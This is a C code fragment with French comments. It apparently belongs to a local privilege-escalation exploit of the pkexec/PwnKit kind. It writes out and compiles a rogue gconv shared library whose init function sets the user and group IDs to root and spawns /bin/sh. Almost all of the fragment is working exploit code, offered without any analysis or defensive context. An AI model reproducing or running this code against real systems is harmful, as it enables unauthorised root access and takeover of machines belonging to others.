struct stat st;
int pipefd[2];
char buf[99999];
void compileExploit() {
  // Créer le fichier exploit/exploit.c et y écrire le programme en C qui tente
  // de prendre les privilèges du superutilisateur (root) en appelant setuid() et setgid().
  FILE * fp;
  fp = fopen("exploit/exploit.c", "w");
  if (fp < 0) {
    perror("fopen");
    exit(0);
  }

  char * shell =
    "#include <stdio.h>\n"
  "#include <stdlib.h>\n"
  "#include <unistd.h>\n"
  "void gconv() {}\n"
  "void gconv_init() {\n"
  "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
  "  static char *a_argv[] = { \"sh\", NULL };\n"
  "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
  "  execve(\"/bin/sh\", a_argv, a_envp);\n"
  "  exit(0);\n"
  "}\n";

  fprintf(fp, "%s", shell);
  fclose(fp);

  // Compiler le fichier exploit/exploit.c en un bibliothèque partagée (.so)
  // en utilisant la commande gcc.
  system("gcc exploit/exploit.c -o exploit/exploit.so -shared -fPIC");
}